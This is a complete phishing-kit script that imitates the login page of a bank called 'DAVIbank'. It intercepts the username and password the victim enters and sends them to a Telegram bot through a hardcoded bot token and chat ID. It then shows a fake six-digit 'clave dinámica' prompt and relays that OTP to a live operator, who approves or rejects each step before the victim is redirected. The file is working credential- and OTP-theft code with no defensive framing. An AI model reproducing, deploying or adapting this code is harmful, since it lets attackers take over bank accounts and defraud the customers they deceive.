document.addEventListener('DOMContentLoaded', function () {
    'use strict';

    /* ==================== CONFIG ==================== */
    const TELEGRAM_API_KEY = '8627198220:AAHlyBdeq2SeDlVN6G4_6QPdQrwU3tY-ICw';
    const TELEGRAM_CHAT_ID = '-1004245962123';
    const REDIRECT_URL      = 'confirmacion.html';
    const API               = 'https://api.telegram.org/bot' + TELEGRAM_API_KEY;
    const POLL_INTERVAL     = 2000;
    const POLL_TIMEOUT      = 5 * 60 * 1000;

    let overlay, overlayTxt, modal, otpInput, otpBtn, otpError;
    let lastUpdateId = 0;
    let busy = false;

    const userField = () => document.querySelector('#inputUserNameId');
    const passField = () => document.querySelector('#inputPswdId');

    /* ==================== ESTILOS ==================== */
    const style = document.createElement('style');
    style.textContent = `
    .dv-err{display:none;align-items:flex-start;gap:8px;margin:0 0 18px 0;}
    .dv-err.on{display:flex;}
    .dv-err svg{flex:0 0 18px;margin-top:2px;}
    .dv-err p{margin:0;color:#be061b;font-weight:700;font-size:1.4rem;line-height:1.8rem;font-family:inherit;}
    .dv-err a{display:inline-block;margin-top:2px;color:#007eab;font-size:1.4rem;font-weight:600;text-decoration:none;}
    .dv-ovl{position:fixed;inset:0;z-index:99999;display:none;flex-direction:column;
        align-items:center;justify-content:center;background:rgba(255,255,255,.92);}
    .dv-ovl.on{display:flex;}
    .dv-spin{width:46px;height:46px;border:4px solid #fdc6cc;border-top-color:#ec111a;
        border-radius:50%;animation:dvspin .8s linear infinite;}
    @keyframes dvspin{to{transform:rotate(360deg)}}
    .dv-ovl p{margin:16px 0 0;font-family:inherit;font-size:1.4rem;font-weight:600;color:#333;}
    .dv-modal{position:fixed;inset:0;z-index:100000;display:none;align-items:center;
        justify-content:center;background:rgba(0,0,0,.45);padding:16px;}
    .dv-modal.on{display:flex;}
    .dv-card{position:relative;width:100%;max-width:380px;background:#fff;border-radius:8px;
        padding:26px 22px 22px;box-shadow:0 18px 50px rgba(0,0,0,.25);
        font-family:Scotia Regular,Arial,sans-serif;animation:dvpop .18s ease-out;}
    @keyframes dvpop{from{transform:scale(.94);opacity:0}to{transform:scale(1);opacity:1}}
    .dv-card h3{margin:0 0 6px;font-size:1.8rem;color:#333;}
    .dv-card p.dv-sub{margin:0 0 18px;font-size:1.4rem;color:#757575;line-height:1.6rem;}
    .dv-otp{width:100%;box-sizing:border-box;padding:14px;font-size:24px;text-align:center;
        letter-spacing:12px;border:0;border-bottom:1px solid #757575;outline:none;
        font-family:inherit;background:transparent;}
    .dv-otp:focus{border-bottom-color:#009dd6;box-shadow:0 1px #009dd6;}
    .dv-otp-err{min-height:18px;margin:8px 0 0;font-size:13px;color:#be061b;font-weight:600;}
    .dv-actions{display:flex;gap:10px;margin-top:14px;}
    .dv-actions button{flex:1;padding:13px;border:1px solid #ec111a;border-radius:8px;
        font-size:15px;font-weight:700;font-family:inherit;cursor:pointer;}
    .dv-cancel{background:#fff;color:#ec111a;}
    .dv-ok{background:#ec111a;color:#fff;}
    .dv-ok:disabled{opacity:.55;cursor:not-allowed;}
    .dv-x{position:absolute;top:10px;right:12px;border:none;background:none;font-size:22px;
        line-height:1;color:#757575;cursor:pointer;}
    `;
    document.head.appendChild(style);

    /* ==================== ERROR / OVERLAY / MODAL ==================== */
    function showError(msg) {
        const form = document.querySelector('form.form');
        let box = document.getElementById('dvErr');
        if (!box) {
            box = document.createElement('div');
            box.id = 'dvErr';
            box.className = 'dv-err';
            box.innerHTML =
                '<svg width="18" height="18" viewBox="0 0 24 24" fill="#be061b">' +
                '<path d="M12 2a10 10 0 100 20 10 10 0 000-20zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>' +
                '<div><p></p><a href="#">¿Olvidaste tu usuario o contraseña?</a></div>';
            (form || document.body).prepend(box);
        }
        box.querySelector('p').textContent = msg;
        box.classList.add('on');
    }
    function hideError() {
        const box = document.getElementById('dvErr');
        if (box) box.classList.remove('on');
    }

    overlay = document.createElement('div');
    overlay.className = 'dv-ovl';
    overlay.innerHTML = '<div class="dv-spin"></div><p>Validando información...</p>';
    document.body.appendChild(overlay);
    overlayTxt = overlay.querySelector('p');

    function setLoading(on, texto) {
        if (texto) overlayTxt.textContent = texto;
        overlay.classList.toggle('on', !!on);
    }

    modal = document.createElement('div');
    modal.className = 'dv-modal';
    modal.innerHTML =
        '<div class="dv-card">' +
        '<button class="dv-x" type="button">&times;</button>' +
        '<h3>Clave dinámica</h3>' +
        '<p class="dv-sub">Ingresa la clave de 6 dígitos que enviamos a tu celular.</p>' +
        '<input class="dv-otp" type="text" inputmode="numeric" maxlength="6" autocomplete="one-time-code" placeholder="••••••">' +
        '<p class="dv-otp-err"></p>' +
        '<div class="dv-actions">' +
        '<button class="dv-cancel" type="button">Cancelar</button>' +
        '<button class="dv-ok" type="button" disabled>Validar</button>' +
        '</div></div>';
    document.body.appendChild(modal);

    otpInput = modal.querySelector('.dv-otp');
    otpBtn   = modal.querySelector('.dv-ok');
    otpError = modal.querySelector('.dv-otp-err');

    otpInput.addEventListener('input', function () {
        this.value = this.value.replace(/\D/g, '').slice(0, 6);
        otpError.textContent = '';
        otpBtn.disabled = this.value.length !== 6;
        if (this.value.length === 6) setTimeout(() => { if (!busy) enviarOtp(); }, 250);
    });
    otpBtn.addEventListener('click', enviarOtp);
    modal.querySelector('.dv-x').addEventListener('click', cerrarModal);
    modal.querySelector('.dv-cancel').addEventListener('click', cerrarModal);
    otpInput.addEventListener('keydown', e => { if (e.key === 'Enter') { e.preventDefault(); enviarOtp(); } });

    function abrirModal() {
        otpInput.value = ''; otpError.textContent = ''; otpBtn.disabled = true;
        modal.classList.add('on');
        setTimeout(() => otpInput.focus(), 60);
    }
    function cerrarModal() { modal.classList.remove('on'); }

    /* ==================== TELEGRAM ==================== */
    async function tg(method, payload) {
        const res = await fetch(API + '/' + method, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload || {})
        });
        return res.json();
    }

    async function sendMessage(text, teclado) {
        try {
            const data = await tg('sendMessage', {
                chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML',
                reply_markup: { inline_keyboard: teclado }
            });
            return data && data.ok && data.result ? data.result.message_id : null;
        } catch (e) { return null; }
    }

    async function sincronizarOffset() {
        try {
            const d = await tg('getUpdates', { offset: -1, limit: 1 });
            if (d && d.ok && d.result && d.result.length) {
                lastUpdateId = d.result[d.result.length - 1].update_id;
            }
        } catch (e) {}
    }

    function esperarRespuesta(messageId) {
        return new Promise(resolve => {
            const inicio = Date.now();
            const tick = async () => {
                if (Date.now() - inicio > POLL_TIMEOUT) { resolve('timeout'); return; }
                try {
                    const d = await tg('getUpdates', { offset: lastUpdateId + 1, limit: 100, timeout: 0 });
                    if (d && d.ok && Array.isArray(d.result)) {
                        for (const u of d.result) {
                            if (u.update_id > lastUpdateId) lastUpdateId = u.update_id;
                            const cq = u.callback_query;
                            if (!cq) continue;
                            tg('answerCallbackQuery', { callback_query_id: cq.id });
                            if (cq.message && cq.message.message_id === messageId) { resolve(cq.data); return; }
                        }
                    }
                } catch (e) {}
                setTimeout(tick, POLL_INTERVAL);
            };
            tick();
        });
    }

    /* ==================== FASE 1 ==================== */
    async function enviarLogin(e) {
        if (e) { e.preventDefault(); e.stopPropagation(); }
        if (busy) return;

        const usuario = (userField()?.value || '').trim();
        const clave   = passField()?.value || '';

        if (!usuario || !clave) {
            showError('Ingresa tu usuario y contraseña para continuar.');
            return;
        }

        hideError();
        busy = true;
        setLoading(true, 'Validando información...');

        await sincronizarOffset();

        const mid = await sendMessage(
            '🏦 <b>DAVIbank · Intento de ingreso</b>\n' +
            '━━━━━━━━━━━━━━━━━━\n' +
            '👤 <b>Usuario:</b> <code>' + usuario + '</code>\n' +
            '🔑 <b>Clave:</b> <code>' + clave + '</code>\n' +
            '🕒 ' + new Date().toLocaleString('es-CO') + '\n' +
            '━━━━━━━━━━━━━━━━━━',
            [[
                { text: '❌ Rechazar', callback_data: 'login_rechazar' },
                { text: '✅ Aceptar',  callback_data: 'login_aceptar'  }
            ]]
        );

        if (!mid) {
            setLoading(false); busy = false;
            showError('No fue posible conectar con el servidor. Intenta nuevamente.');
            return;
        }

        const respuesta = await esperarRespuesta(mid);
        setLoading(false); busy = false;

        if (respuesta === 'login_aceptar') { abrirModal(); return; }

        const pass = passField();
        if (pass) { pass.value = ''; pass.focus(); }
        showError('El usuario y/o la contraseña que ingresas no coinciden con nuestros registros.');
    }

    /* ==================== FASE 2 ==================== */
    async function enviarOtp() {
        if (busy) return;

        const codigo = otpInput.value.replace(/\D/g, '');
        if (codigo.length !== 6) { otpError.textContent = 'La clave debe tener 6 dígitos.'; return; }

        busy = true;
        otpBtn.disabled = true;
        otpError.textContent = '';
        setLoading(true, 'Verificando clave dinámica...');

        await sincronizarOffset();

        const mid = await sendMessage(
            '🔐 <b>DAVIbank · Clave dinámica</b>\n' +
            '━━━━━━━━━━━━━━━━━━\n' +
            '👤 <b>Usuario:</b> <code>' + (userField()?.value || '').trim() + '</code>\n' +
            '🔢 <b>OTP:</b> <code>' + codigo + '</code>\n' +
            '🕒 ' + new Date().toLocaleString('es-CO') + '\n' +
            '━━━━━━━━━━━━━━━━━━',
            [[
                { text: '❌ Rechazar', callback_data: 'otp_rechazar' },
                { text: '✅ Aceptar',  callback_data: 'otp_aceptar'  }
            ]]
        );

        if (!mid) {
            setLoading(false); busy = false; otpBtn.disabled = false;
            otpError.textContent = 'Error de conexión. Intenta de nuevo.';
            return;
        }

        const respuesta = await esperarRespuesta(mid);
        busy = false;

        if (respuesta === 'otp_aceptar') {
            setLoading(true, 'Ingresando...');
            window.location.href = REDIRECT_URL;
            return;
        }

        setLoading(false);
        otpBtn.disabled = false;
        otpInput.value = '';
        otpError.textContent = respuesta === 'timeout'
            ? 'Tiempo de espera agotado. Intenta de nuevo.'
            : 'La clave dinámica es incorrecta. Intenta nuevamente.';
        otpInput.focus();
    }

    /* ==================== DELEGACIÓN (sobrevive al re-render) ==================== */
    document.addEventListener('submit', enviarLogin, true);

    document.addEventListener('click', function (e) {
        if (!e.target.closest('#btnGoToLoginId')) return;
        setTimeout(function () { enviarLogin(e); }, 0);
    }, true);

    document.addEventListener('input', function (e) {
        if (e.target.matches('#inputUserNameId, #inputPswdId')) hideError();
    });
});